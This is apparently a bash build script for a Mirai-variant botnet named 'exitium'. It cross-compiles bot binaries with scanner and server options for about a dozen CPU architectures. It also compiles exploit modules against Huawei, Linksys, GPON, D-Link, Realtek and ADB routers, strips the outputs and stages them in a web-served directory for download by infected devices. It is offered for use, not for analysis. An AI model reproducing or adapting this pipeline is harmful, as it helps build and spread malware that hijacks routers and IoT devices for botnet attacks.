#!/bin/bash
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/mips64/bin
export PATH=$PATH:/etc/xcompile/armv4eb/bin
export PATH=$PATH:/etc/xcompile/armv4tl/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i486/bin
export PATH=$PATH:/etc/xcompile/arc/bin
rm -rf /var/www/html/exitium
mkdir /var/www/html/exitium/
mkdir /var/www/html/exitium/scrios
mkdir /var/www/html/exitium/scrios/exitium
makedir="/var/www/html/exitium/scrios/exitium"
echodir="/var/www/html/exitium/scrios/exitium"

bin="lol"
function compile_exploits {
    "$1-gcc" $3 gcc b/*.c b/s/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o r/"$2" -DMIRAI_b_ARCH=\""$1"\"
    "$1-strip" r/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

function compile_b {
    "$1-gcc" $3 b/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o r/"$2" -DMIRAI_b_ARCH=\""$1"\"
    "$1-strip" r/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function arm7_compile {
    "$1-gcc" $3 b/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o r/"$2" -DMIRAI_b_ARCH=\""$1"\"
}
function arc_compile {
    "$1-linux-gcc" -DMIRAI_b_ARCH="$3" b/*.c -s -o r/"$2"
}

rm -rf r
mkdir r
mkdir /var/www
mkdir /var/www/html
mkdir /var/www/html/exitium
mkdir $makedir
mkdir $makedir/0
mkdir $makedir/0/1
mkdir $makedir/0/2
mkdir $makedir/0/3
mkdir $makedir/0/4
mkdir $makedir/0/5
mkdir $makedir/0/6
mkdir $makedir/0/7
mkdir $makedir/0/8
mkdir $makedir/0/9
mkdir $makedir/0/10
mkdir $makedir/0/11
mkdir $makedir/0/12

mkdir $makedir/0/1/ep
mkdir $makedir/0/2/ep
mkdir $makedir/0/3/ep
mkdir $makedir/0/4/ep
mkdir $makedir/0/5/ep
mkdir $makedir/0/6/ep
mkdir $makedir/0/7/ep
mkdir $makedir/0/8/ep
mkdir $makedir/0/9/ep
mkdir $makedir/0/10/ep
mkdir $makedir/0/11/ep
mkdir $makedir/0/12/ep


echo "" >> /var/www/html/index.php
echo "" >> /var/www/html/exitium/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/index.php
echo "" >> $echodir/0/index.php
echo "" >> $echodir/0/1/index.php
echo "" >> $echodir/0/2/index.php
echo "" >> $echodir/0/3/index.php
echo "" >> $echodir/0/4/index.php
echo "" >> $echodir/0/5/index.php
echo "" >> $echodir/0/6/index.php
echo "" >> $echodir/0/7/index.php
echo "" >> $echodir/0/8/index.php
echo "" >> $echodir/0/9/index.php
echo "" >> $echodir/0/10/index.php
echo "" >> $echodir/0/11/index.php
echo "" >> $echodir/0/12/index.php

echo "" >> $echodir/0/1/ep/index.php
echo "" >> $echodir/0/2/ep/index.php
echo "" >> $echodir/0/3/ep/index.php
echo "" >> $echodir/0/4/ep/index.php
echo "" >> $echodir/0/5/ep/index.php
echo "" >> $echodir/0/6/ep/index.php
echo "" >> $echodir/0/7/ep/index.php
echo "" >> $echodir/0/8/ep/index.php
echo "" >> $echodir/0/9/ep/index.php
echo "" >> $echodir/0/10/ep/index.php
echo "" >> $echodir/0/11/ep/index.php
echo "" >> $echodir/0/12/ep/index.php

compile_b i586 yeahwell_we_cant_help_it1 "-static -DSCANNER -DSERVER -w"
compile_b mips yeahwell_we_cant_help_it2 "-static -DSCANNER -DSERVER -w"
compile_b mipsel yeahwell_we_cant_help_it3 "-static -DSCANNER -DSERVER -w"
compile_b armv4l yeahwell_we_cant_help_it4 "-static -DSCANNER -DSERVER -w"
compile_b armv5l yeahwell_we_cant_help_it5 "-static -DSCANNER -DSERVER -w"
compile_b armv6l yeahwell_we_cant_help_it6 "-static -DSCANNER -DSERVER -w"
arm7_compile armv7l yeahwell_we_cant_help_it7 "-static -DSCANNER -DSERVER -w"
compile_b powerpc yeahwell_we_cant_help_it8 "-static -DSCANNER -DSERVER -w"
compile_b sparc yeahwell_we_cant_help_it9 "-static -DSCANNER -DSERVER -w"
compile_b m68k yeahwell_we_cant_help_it10 "-static -DSCANNER -DSERVER -w"
compile_b sh4 yeahwell_we_cant_help_it11 "-static -DSCANNER -DSERVER -w"
arc_compile arc yeahwell_we_cant_help_it12 "-static -DSCANNER -DSERVER -w"

compile_exploits mips hhelp "-static -Dxrep -Dhuawei -w"
compile_exploits mips lhelp "-static -Dxrep -Dlinksys -w"
#compile_exploits armv4l thelp "-static -Dtenda -w"
#compile_exploits mips g8080help "-static -Dgpon8080 -w"
compile_exploits mips g80help "-static -Dxrep -Dgpon80 -w"
#compile_exploits mips g443help "-static -Dgpon443 -w"
#compile_exploits i586 uchttpdhelp "-static -Duchttpd -w"
#compile_exploits i586 coappdhelp "-static -Dcoap -w"
compile_exploits mips dhelp "-static -Dxrep -Ddlink -w"
compile_exploits mips rhelp "-static -Dxrep -Drealtek -w"
compile_exploits mips ahelp "-static -Dxrep -Dadb -w"


cp r/yeahwell_we_cant_help_it1 $makedir/0/1
cp r/yeahwell_we_cant_help_it2 $makedir/0/2
cp r/yeahwell_we_cant_help_it3 $makedir/0/3
cp r/yeahwell_we_cant_help_it4 $makedir/0/4
cp r/yeahwell_we_cant_help_it5 $makedir/0/5
cp r/yeahwell_we_cant_help_it6 $makedir/0/6
cp r/yeahwell_we_cant_help_it7 $makedir/0/7
cp r/yeahwell_we_cant_help_it8 $makedir/0/8
cp r/yeahwell_we_cant_help_it9 $makedir/0/9
cp r/yeahwell_we_cant_help_it10 $makedir/0/10
cp r/yeahwell_we_cant_help_it11 $makedir/0/11
cp r/yeahwell_we_cant_help_it12 $makedir/0/12

cp r/hhelp $makedir/0/2/ep
cp r/lhelp $makedir/0/3/ep
cp r/thelp $makedir/0/4/ep
cp r/gpon8080help $makedir/0/2/ep
cp r/gpon80help $makedir/0/2/ep
cp r/gpon443help $makedir/0/2/ep
cp r/uchttpdhelp $makedir/0/1/ep
cp r/coappdhelp $makedir/0/1/ep

cp r/dhelp $makedir/0/2/ep
cp r/rhelp $makedir/0/2/ep
cp r/ahelp $makedir/0/2/ep